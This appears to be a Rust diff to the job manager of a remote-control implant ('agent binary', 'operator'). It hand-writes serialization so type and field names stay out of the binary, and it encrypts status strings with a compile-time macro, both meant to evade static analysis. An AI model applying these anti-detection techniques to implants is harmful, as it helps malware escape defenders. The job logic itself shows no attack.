@@ -6,9 +6,10 @@
 
 use std::collections::HashMap;
 use std::sync::Arc;
+use crate::strcrypt_rt;
+use strcrypt::aes_str;
 use tokio::sync::mpsc;
 
-use crate::strcrypt_rt;
 use tokio::task::{JoinHandle, AbortHandle};
 use serde::{Serialize, Deserialize};
 use chrono::Utc;
@@ -17,7 +18,9 @@ use crate::common::CommandResponse;
 
 // ── Types ──────────────────────────────────────────────────────────────
 
-#[derive(Clone, Debug, Serialize, Deserialize, PartialEq)]
+/// Serde: u8 variant index (Running=0, Completed=1, Failed=2, Killed=3) -
+/// manual impl so variant names don't leak into the agent binary.
+#[derive(Clone, Debug, PartialEq)]
 pub enum JobStatus {
     Running,
     Completed,
@@ -25,7 +28,9 @@ pub enum JobStatus {
     Killed,
 }
 
-#[derive(Clone, Debug, Serialize)]
+/// Serde: positional seq [id, description, status, started_at, finished_at,
+/// chunks_sent] - no field names in the agent binary.
+#[derive(Clone, Debug)]
 pub struct JobInfo {
     pub id: u32,
     pub description: String,
@@ -34,6 +39,57 @@ pub struct JobInfo {
     pub finished_at: Option<String>,
     /// Number of output chunks already delivered.
     pub chunks_sent: usize,
+}
+
+impl Serialize for JobStatus {
+    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
+        serializer.serialize_u8(match self {
+            JobStatus::Running => 0,
+            JobStatus::Completed => 1,
+            JobStatus::Failed => 2,
+            JobStatus::Killed => 3,
+        })
+    }
+}
+
+impl<'de> Deserialize<'de> for JobStatus {
+    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
+        struct V;
+        impl<'de> serde::de::Visitor<'de> for V {
+            type Value = JobStatus;
+            fn expecting(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result { f.write_str(aes_str!("u8").as_str()) }
+            fn visit_u8<E: serde::de::Error>(self, v: u8) -> Result<Self::Value, E> {
+                Ok(match v {
+                    0 => JobStatus::Running,
+                    1 => JobStatus::Completed,
+                    2 => JobStatus::Failed,
+                    3 => JobStatus::Killed,
+                    _ => return Err(E::custom(aes_str!("bad variant"))),
+                })
+            }
+            fn visit_u64<E: serde::de::Error>(self, v: u64) -> Result<Self::Value, E> {
+                if v <= u8::MAX as u64 { self.visit_u8(v as u8) } else { Err(E::custom(aes_str!("bad variant"))) }
+            }
+            fn visit_i64<E: serde::de::Error>(self, v: i64) -> Result<Self::Value, E> {
+                if v >= 0 && v <= u8::MAX as i64 { self.visit_u8(v as u8) } else { Err(E::custom(aes_str!("bad variant"))) }
+            }
+        }
+        deserializer.deserialize_u8(V)
+    }
+}
+
+impl Serialize for JobInfo {
+    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
+        use serde::ser::SerializeSeq;
+        let mut seq = serializer.serialize_seq(None)?;
+        seq.serialize_element(&self.id)?;
+        seq.serialize_element(&self.description)?;
+        seq.serialize_element(&self.status)?;
+        seq.serialize_element(&self.started_at)?;
+        seq.serialize_element(&self.finished_at)?;
+        seq.serialize_element(&self.chunks_sent)?;
+        seq.end()
+    }
 }
 
 /// Internal bookkeeping (not serialized to operator).
@@ -106,10 +162,10 @@ impl JobManager {
             let (output, error, exit_code) = match result {
                 Ok(r) => r,
                 Err(e) if e.is_cancelled() => {
-                    (format!("[Job {}] Killed by operator", job_id), String::new(), -1)
+                    (format!("{}{}{}", strcrypt::aes_str!("[Job "), job_id, strcrypt::aes_str!("] Killed by operator")), String::new(), -1)
                 }
                 Err(e) => {
-                    (String::new(), format!("[Job {}] Panicked: {}", job_id, e), -1)
+                    (String::new(), format!("{}{}{}{}", strcrypt::aes_str!("[Job "), job_id, strcrypt::aes_str!("] Panicked: "), e), -1)
                 }
             };
 
@@ -160,12 +216,12 @@ impl JobManager {
                 entry.abort.abort();
                 entry.info.status = JobStatus::Killed;
                 entry.info.finished_at = Some(Utc::now().to_rfc3339());
-                format!("Job {} killed", job_id)
+                format!("{}{}{}", strcrypt::aes_str!("Job "), job_id, strcrypt::aes_str!(" killed"))
             } else {
-                format!("Job {} is already {:?}", job_id, entry.info.status)
+                format!("{}{}{}{:?}", strcrypt::aes_str!("Job "), job_id, strcrypt::aes_str!(" is already "), entry.info.status)
             }
         } else {
-            format!("Job {} not found", job_id)
+            format!("{}{}{}", strcrypt::aes_str!("Job "), job_id, strcrypt::aes_str!(" not found"))
         }
     }
 
